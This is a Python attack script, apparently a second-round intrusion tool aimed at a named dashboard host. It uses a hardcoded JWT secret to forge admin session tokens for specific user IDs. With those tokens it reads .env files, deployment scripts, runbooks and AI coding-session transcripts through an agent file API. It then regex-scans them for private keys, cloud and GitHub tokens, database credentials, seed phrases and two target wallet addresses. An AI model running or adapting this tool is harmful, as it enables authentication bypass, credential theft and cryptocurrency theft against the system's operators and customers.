#!/usr/bin/env python3
# i29158 round2: explicit high-value file reads in lumii-assistant / lumii-work-ops
# + deep grep across .codex-sessions transcripts. Read-only.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
T0 = time.time()
def el(): return int(time.time() - T0)
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
OUTBUDGET = [1200000]
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    OUTBUDGET[0] -= len(s)
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def curl(args, timeout=35):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, token=None, timeout=30, maxlen=300000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if token: args += ["-H", "Cookie: session=" + token]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i+8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "len": len(txt)}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def forge(payload):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps(payload, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig
def tok_for(uid, customer="aro"):
    return forge({"userId": uid, "email": "probe@x", "customer": customer, "role": "admin"})
def jload(s):
    try: return json.loads(s)
    except Exception: return None
def qp(p): return up.quote(p, safe="/")

def lst(aid, path, tok):
    r = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp(path)), token=tok, maxlen=300000)
    j = jload(r["body"])
    ents = j.get("entries") if isinstance(j, dict) and isinstance(j.get("entries"), list) else []
    return r["code"], ents, r["body"][:200]

def rd(aid, path, tok):
    r = call("/api/agents/%s/files?action=read&path=%s" % (aid, qp(path)), token=tok)
    return r["code"], r["body"], r["len"]
def content_of(body):
    j = jload(body)
    if isinstance(j, dict):
        for k in ("content", "text", "data", "body"):
            if isinstance(j.get(k), str): return j[k]
        return None
    return body

PATTERNS = [
 ("0x64", re.compile(r'\b0x[0-9a-fA-F]{64}\b')),
 ("JWT", re.compile(r'(?i)jwt[_\-]?secret\s*[:=]\s*\S{6,}')),
 ("DSN", re.compile(r'(?i)(postgres(?:ql)?://[^\s"\'<>]+|mysql://[^\s"\'<>]+|redis://[^\s"\'<>]+|mongodb(?:\+srv)?://[^\s"\'<>]+|DATABASE_URL\s*[:=]\s*\S{8,})')),
 ("CLOUD", re.compile(r'(AKID[A-Za-z0-9]{26,}|LTAI[A-Za-z0-9]{12,}|AKIA[0-9A-Z]{16}|dckr_pat_[A-Za-z0-9_\-]{20,}|ASIA[0-9A-Z]{16})')),
 ("PEM", re.compile(r'-----BEGIN [A-Z ]*PRIVATE KEY-----')),
 ("GHTOK", re.compile(r'(gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{40,}|glpat-[A-Za-z0-9_\-]{16,})')),
 ("SK", re.compile(r'(sk-[A-Za-z0-9_\-]{20,}|Bearer\s+[A-Za-z0-9\._\-]{25,})')),
 ("ZOO", re.compile(r'(?i)(zoofi[\-_]?index|wand-index|api\.zoofi\.io|trycloudflare\.com|cloudflared|cf[\-_]tunnel|argotunnel\.com)')),
 ("HMAC", re.compile(r'(?i)(x-hub-signature(-256)?|hmac[\w\-]*\s*[:=]\s*\S{8,}|webhook[\w\-]*\s*[:=]\s*\S{8,}|WH_SECRET|SIGNATURE_SECRET\s*[:=]\s*\S{6,})')),
 ("CRYPT", re.compile(r'(?i)(mnemonic|cipherparams|"crypto"\s*:\s*\{|"scrypt"|kdfparams|seed phrase)')),
 ("SECRETKV", re.compile(r'(?i)[A-Za-z0-9_\-]*(secret|passw|passwd|token|apikey|api[_-]?key|access[_-]?key|private[_-]?key|credential)[A-Za-z0-9_\-]*\s*[:=]\s*["\']?[A-Za-z0-9_\-\/+=\.!@#$%^&*]{12,}')),
 ("IP", re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b')),
 ("URL", re.compile(r'https?://[A-Za-z0-9\.\-_]+(?::\d{2,5})?')),
]
TARGET_EOA = ["c56f7063fd6d199ccc443dbbf4283be602d46343", "fe18aa1efa652660f36ab84f122cd36108f903b6"]
PRIVIP = re.compile(r'(^10\.|^127\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[01])\.|^169\.254\.)')

def scan_text(txt, keep_ip=True):
    res = {}; lines = txt.splitlines()
    for tag, rx in PATTERNS:
        hits = []; seen = set()
        for ln in lines:
            if len(ln) > 4000: ln = ln[:4000]
            for m in rx.finditer(ln):
                s = m.group(0)[:260]
                if tag == "IP" and (not keep_ip or not PRIVIP.search(s)): continue
                if tag == "URL" and re.search(r'(?i)(github\.com|githubusercontent|docs\.anthropic|deepseek\.com|openai\.com|npmjs|jsdelivr|w3\.org|example\.com|localhost|127\.0\.0\.1|schemas|gnu\.org|apache\.org|creativecommons|go\.dev|golang\.org|pypi|nodejs\.org|vitejs|tailwindcss|react)', s): continue
                if s in seen: continue
                seen.add(s); hits.append(s)
                if len(hits) >= 15: break
            if len(hits) >= 15: break
        if hits: res[tag] = hits
    if "0x64" in res:
        for h in res["0x64"]:
            if h.lower()[2:] in TARGET_EOA:
                res.setdefault("TARGET_EOA_HIT", []).append(h)
    return res

def read_one(aid, p, tok, full_cap=15000):
    code, body, ln = rd(aid, p, tok)
    if code != "200":
        return {"p": p, "code": code}
    c = content_of(body)
    if c is None:
        return {"p": p, "code": "200-nocontent", "raw": body[:400]}
    rec = {"p": p, "len": len(c)}
    m = scan_text(c)
    if m: rec["matches"] = m
    if len(c) <= full_cap:
        rec["text"] = c
    else:
        rec["head"] = c[:2000]
    return rec

def do_files(aid, tok, paths, tag, full_cap=15000):
    items = []
    for p in paths:
        rec = read_one(aid, p, tok, full_cap=full_cap)
        items.append(rec)
        if OUTBUDGET[0] < 300000:
            items.append({"NOTE": "budget stop"}); break
    R(tag, {"n": len(items), "items": items})

def walk(aid, root, tok, depth, max_entries=800):
    files = []; queue = [(root, 0)]; seen = set(); truncated = False
    SKIP = re.compile(r'(^|/)(node_modules|\.git|\.next|dist|build|vendor|__pycache__|\.cache|_cacache|\.venv|site-packages|target|\.turbo)(/|$)')
    while queue:
        cur, d = queue.pop(0)
        if cur in seen: continue
        seen.add(cur)
        code, ents, snip = lst(aid, cur, tok)
        if code != "200": continue
        for e in ents:
            name = str(e.get("name") or ""); typ = str(e.get("type") or ""); size = e.get("size")
            p = cur.rstrip("/") + "/" + name
            if typ in ("directory", "dir"):
                if SKIP.search(p): continue
                if d + 1 <= depth: queue.append((p, d + 1))
            else:
                files.append({"p": p, "size": size if isinstance(size, int) else 0})
            if len(files) >= max_entries:
                truncated = True; break
        if truncated: break
    return files, truncated

def codex_sweep(aid, tok, root, maxfiles=160, maxsize=250000):
    files, trunc = walk(aid, root, tok, depth=3, max_entries=1200)
    cand = [f for f in files if f["size"] and f["size"] <= maxsize]
    cand.sort(key=lambda f: -f["size"])  # bigger transcripts first
    out = []
    nread = 0
    for f in cand[:maxfiles]:
        code, body, ln = rd(aid, f["p"], tok)
        nread += 1
        if code != "200": continue
        txt = content_of(body)
        if not txt: continue
        m = scan_text(txt)
        # also keyword probe
        kw = {}
        for w in ["private key", "mnemonic", "seed phrase", "wallet", "crust", "zoofi", "mysql", "postgres", "redis", "ssh ", "webhook", "password"]:
            c = txt.lower().count(w)
            if c: kw[w] = c
        if m or any(k in kw for k in ("private key", "mnemonic", "seed phrase", "wallet", "zoofi")):
            out.append({"p": f["p"].replace(root.rstrip("/") + "/", ""), "len": len(txt), "matches": m, "kw": kw})
        if OUTBUDGET[0] < 400000:
            out.append({"NOTE": "budget stop at %s" % f["p"]}); break
    R("B_CODEX_SWEEP2", {"read": nread, "cand": len(cand), "hits": out})

def main():
    R("health", call("/api/health", maxlen=1200))
    tokC = tok_for("bc09d9cc-63b0-11f1-ac43-525400595be1", "goldenyears")
    tokB = tok_for("cef8ec22-4906-11f1-ac43-525400595be1", "plexus")
    aidC = "agent-8c6ac8b3"; aidB = "agent-768c13da"

    # ---- C lumii-assistant: crown-jewel env + docs/deploy
    A = "/home/lumii/lumii-assistant/"
    assist = [
        ".env.dev", ".env.dev.example", ".gstack/browse-audit.jsonl",
        "docs/ADMINS.md", "docs/DEV-INSTANCE.md", "docs/OPS.md",
        "docs/RUNBOOK-2026-09-21-prod.md", "docs/RUNBOOK-2026-10-14-prod-feishu-sync.md",
        "docs/DEPLOY-PROD.md", "docs/DEPLOY-STAGING.md", "docs/DEPLOY-SHARED-CENTER.md",
        "docs/DEPLOY-CLOUD.md", "docs/CUSTOMER-INSTANCE-DEPLOYMENT.md",
        "deploy/release.sh", "deploy/publish-lak.sh", "deploy/cloud-release.sh",
        "deploy/customer-release.sh", "deploy/stage-build.sh", "deploy/stage-sync.sh",
        "deploy/feishu-ingress-envs.sh", "deploy/install-kb-relay.sh", "deploy/registry-mirror-install.sh",
        "deploy/registry-cutover.sh", "deploy/desktop-relay.md", "deploy/lak-release-artifacts.py",
        "package.json", "CLAUDE.md", "TODOS.md", "docs/FRESH-MACHINE-SETUP.md", "docs/ARCHITECTURE.md",
        ".superpowers/links-ops-backend-report.md", ".superpowers/links-ops-web-report.md",
        "docs/LEGAL-DOCUMENTS.md", "docs/QA-2026-08-19-STAGING.md", "docs/RUNBOOK-2026-10-agent-task-table-migration.md",
        "docs/RUNBOOK-2026-09-28-prod-lak-v1.2.91.md", "docs/RUNBOOK-2026-10-09-prod-lak-v1.2.107.md",
    ]
    do_files(aidC, tokC, [A + x for x in assist], "C2_ASSIST", full_cap=12000)

    # ---- C lumii-work-ops deploy/env
    W = "/home/lumii/lumii-work-ops/"
    work = [
        "deploy/lumii-ops.env.example", "agent/deploy/lumii-ops-agent.env.example",
        "deploy/install.sh", "agent/deploy/watchdog.sh", "deploy/Caddyfile.example",
        "deploy/lumii-ops-server.service", "agent/deploy/lumii-ops-agent.service",
        "README.md", "DEPLOY.md", "docs/运营平台接口需求.md", "scripts/seed-demo.ts",
        "src/server/releases/signing.ts", "src/server/config.ts", "agent/internal/config/config.go",
        "agent/internal/job/deploy.go", "docs/superpowers/plans/2026-10-14-ops-platform-v1.md",
        "docs/superpowers/plans/2026-10-15-jobs-and-releases.md", "package.json",
    ]
    do_files(aidC, tokC, [W + x for x in work], "C2_WORKOPS", full_cap=14000)

    # ---- B codex-sessions deep sweep
    codex_sweep(aidB, tokB, "/home/lumii/.codex-sessions", maxfiles=150, maxsize=260000)

    R("DONE", {"elapsed": el(), "outbudget_left": OUTBUDGET[0]})

try:
    main()
except Exception:
    import traceback
    R("FATAL", traceback.format_exc()[-3000:])
finally:
    R("END", {"elapsed": el()})
    sys.exit(1)
